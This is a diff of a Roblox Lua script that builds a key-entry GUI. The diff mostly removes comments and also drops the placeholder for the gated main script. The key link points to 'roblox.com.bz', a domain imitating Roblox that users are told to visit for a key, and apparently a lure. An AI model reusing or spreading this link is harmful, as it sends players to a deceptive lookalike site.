@@ -1,37 +1,16 @@
--- ============================================
---           KEY SYSTEM GUI
---         Change link below freely
--- ============================================
-
-local KEY_LINK = "https://roblox.com.bz/communities/8315875508/"  -- << CHANGE THIS ANYTIME
-local VALID_KEY = "YourSecretKey123"                -- << CHANGE THIS TO YOUR KEY
-
--- ============================================
---              SERVICES
--- ============================================
-
+local KEY_LINK = "https://roblox.com.bz/communities/8315875508/"
+local VALID_KEY = "YourSecretKey123"
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
 local RunService = game:GetService("RunService")
-
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
-
--- ============================================
---              SCREEN GUI
--- ============================================
-
 local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.Name = "KeySystem"
 ScreenGui.ResetOnSpawn = false
 ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 ScreenGui.Parent = playerGui
-
--- ============================================
---              BLUR OVERLAY
--- ============================================
-
 local Overlay = Instance.new("Frame")
 Overlay.Name = "Overlay"
 Overlay.Size = UDim2.new(1, 0, 1, 0)
@@ -41,11 +20,6 @@ Overlay.BackgroundTransparency = 0.45
 Overlay.BorderSizePixel = 0
 Overlay.ZIndex = 1
 Overlay.Parent = ScreenGui
-
--- ============================================
---              MAIN WINDOW
--- ============================================
-
 local MainFrame = Instance.new("Frame")
 MainFrame.Name = "MainFrame"
 MainFrame.Size = UDim2.new(0, 480, 0, 260)
@@ -54,20 +28,14 @@ MainFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 18)
 MainFrame.BorderSizePixel = 0
 MainFrame.ZIndex = 2
 MainFrame.Parent = ScreenGui
-
--- Rounded corners
 local MainCorner = Instance.new("UICorner")
 MainCorner.CornerRadius = UDim.new(0, 14)
 MainCorner.Parent = MainFrame
-
--- Neon border stroke
 local MainStroke = Instance.new("UIStroke")
 MainStroke.Color = Color3.fromRGB(0, 170, 255)
 MainStroke.Thickness = 1.5
 MainStroke.Transparency = 0.3
 MainStroke.Parent = MainFrame
-
--- Subtle inner glow gradient
 local BgGradient = Instance.new("UIGradient")
 BgGradient.Color = ColorSequence.new({
     ColorSequenceKeypoint.new(0, Color3.fromRGB(14, 14, 28)),
@@ -75,11 +43,6 @@ BgGradient.Color = ColorSequence.new({
 })
 BgGradient.Rotation = 135
 BgGradient.Parent = MainFrame
-
--- ============================================
---              TOP ACCENT BAR
--- ============================================
-
 local AccentBar = Instance.new("Frame")
 AccentBar.Name = "AccentBar"
 AccentBar.Size = UDim2.new(1, 0, 0, 3)
@@ -88,7 +51,6 @@ AccentBar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
 AccentBar.BorderSizePixel = 0
 AccentBar.ZIndex = 3
 AccentBar.Parent = MainFrame
-
 local AccentGrad = Instance.new("UIGradient")
 AccentGrad.Color = ColorSequence.new({
     ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 100, 255)),
@@ -100,11 +62,6 @@ AccentGrad.Parent = AccentBar
 local AccentBarCorner = Instance.new("UICorner")
 AccentBarCorner.CornerRadius = UDim.new(0, 14)
 AccentBarCorner.Parent = AccentBar
-
--- ============================================
---              LOGO / TITLE AREA
--- ============================================
-
 local TitleLabel = Instance.new("TextLabel")
 TitleLabel.Name = "Title"
 TitleLabel.Size = UDim2.new(1, 0, 0, 36)
@@ -116,7 +73,6 @@ TitleLabel.Font = Enum.Font.GothamBold
 TitleLabel.TextSize = 20
 TitleLabel.ZIndex = 3
 TitleLabel.Parent = MainFrame
-
 local SubLabel = Instance.new("TextLabel")
 SubLabel.Name = "Sub"
 SubLabel.Size = UDim2.new(1, 0, 0, 18)
@@ -128,11 +84,6 @@ SubLabel.Font = Enum.Font.Gotham
 SubLabel.TextSize = 12
 SubLabel.ZIndex = 3
 SubLabel.Parent = MainFrame
-
--- ============================================
---              DIVIDER
--- ============================================
-
 local Divider = Instance.new("Frame")
 Divider.Size = UDim2.new(0.85, 0, 0, 1)
 Divider.Position = UDim2.new(0.075, 0, 0, 78)
@@ -140,11 +91,6 @@ Divider.BackgroundColor3 = Color3.fromRGB(30, 40, 60)
 Divider.BorderSizePixel = 0
 Divider.ZIndex = 3
 Divider.Parent = MainFrame
-
--- ============================================
---              KEY INPUT BOX
--- ============================================
-
 local InputBox = Instance.new("TextBox")
 InputBox.Name = "KeyInput"
 InputBox.Size = UDim2.new(0.84, 0, 0, 42)
@@ -160,21 +106,16 @@ InputBox.ClearTextOnFocus = false
 InputBox.BorderSizePixel = 0
 InputBox.ZIndex = 3
 InputBox.Parent = MainFrame
-
 local InputCorner = Instance.new("UICorner")
 InputCorner.CornerRadius = UDim.new(0, 8)
 InputCorner.Parent = InputBox
-
 local InputStroke = Instance.new("UIStroke")
 InputStroke.Color = Color3.fromRGB(30, 60, 100)
 InputStroke.Thickness = 1.2
 InputStroke.Parent = InputBox
-
 local InputPadding = Instance.new("UIPadding")
 InputPadding.PaddingLeft = UDim.new(0, 12)
 InputPadding.Parent = InputBox
-
--- Focus glow effect on input
 InputBox.Focused:Connect(function()
     TweenService:Create(InputStroke, TweenInfo.new(0.2), {
         Color = Color3.fromRGB(0, 170, 255),
@@ -189,10 +130,6 @@ InputBox.FocusLost:Connect(function()
     }):Play()
 end)
 
--- ============================================
---              STATUS LABEL
--- ============================================
-
 local StatusLabel = Instance.new("TextLabel")
 StatusLabel.Name = "Status"
 StatusLabel.Size = UDim2.new(0.84, 0, 0, 18)
@@ -205,11 +142,6 @@ StatusLabel.TextSize = 11
 StatusLabel.TextXAlignment = Enum.TextXAlignment.Left
 StatusLabel.ZIndex = 3
 StatusLabel.Parent = MainFrame
-
--- ============================================
---         BUTTONS  (Check Key | Copy Link)
--- ============================================
-
 local function createButton(text, posX, color1, color2)
     local btn = Instance.new("TextButton")
     btn.Size = UDim2.new(0, 168, 0, 44)
@@ -268,11 +200,6 @@ local CopyBtn = createButton(
 )
 -- Right-align it properly
 CopyBtn.Position = UDim2.new(1, -168 - 38, 0, 172)
-
--- ============================================
---              CLOSE BUTTON
--- ============================================
-
 local CloseBtn = Instance.new("TextButton")
 CloseBtn.Size = UDim2.new(0, 28, 0, 28)
 CloseBtn.Position = UDim2.new(1, -38, 0, 10)
@@ -294,11 +221,6 @@ CloseBtn.MouseButton1Click:Connect(function()
     ScreenGui:Destroy()
 end)
 
--- ============================================
---              LOGIC
--- ============================================
-
--- CHECK KEY
 CheckBtn.MouseButton1Click:Connect(function()
     local input = InputBox.Text
 
@@ -308,7 +230,7 @@ CheckBtn.MouseButton1Click:Connect(function()
         return
     end
 
-    -- Animate button press
+
     TweenService:Create(CheckBtn, TweenInfo.new(0.08), { Size = UDim2.new(0, 162, 0, 40) }):Play()
     task.delay(0.08, function()
         TweenService:Create(CheckBtn, TweenInfo.new(0.08), { Size = UDim2.new(0, 168, 0, 44) }):Play()
@@ -316,9 +238,7 @@ CheckBtn.MouseButton1Click:Connect(function()
 
     if input == VALID_KEY then
         StatusLabel.Text = "✅  Key accepted! Loading..."
-        StatusLabel.TextColor3 = Color3.fromRGB(0, 220, 100)
 
-        -- Fade out and destroy after 1.5s
         task.delay(1.5, function()
             TweenService:Create(ScreenGui:FindFirstChild("MainFrame"), TweenInfo.new(0.4), {
                 BackgroundTransparency = 1
@@ -328,14 +248,14 @@ CheckBtn.MouseButton1Click:Connect(function()
             }):Play()
             task.delay(0.45, function()
                 ScreenGui:Destroy()
-                -- << PUT YOUR MAIN SCRIPT LOGIC HERE >>
+         
             end)
         end)
     else
         StatusLabel.Text = "❌  Invalid key. Get yours via Copy Link."
         StatusLabel.TextColor3 = Color3.fromRGB(255, 70, 70)
 
-        -- Shake animation
+  
         local orig = MainFrame.Position
         for i = 1, 4 do
             task.delay(i * 0.05, function()
@@ -353,7 +273,7 @@ CheckBtn.MouseButton1Click:Connect(function()
     end
 end)
 
--- COPY LINK
+
 CopyBtn.MouseButton1Click:Connect(function()
     -- Animate button press
     TweenService:Create(CopyBtn, TweenInfo.new(0.08), { Size = UDim2.new(0, 162, 0, 40) }):Play()
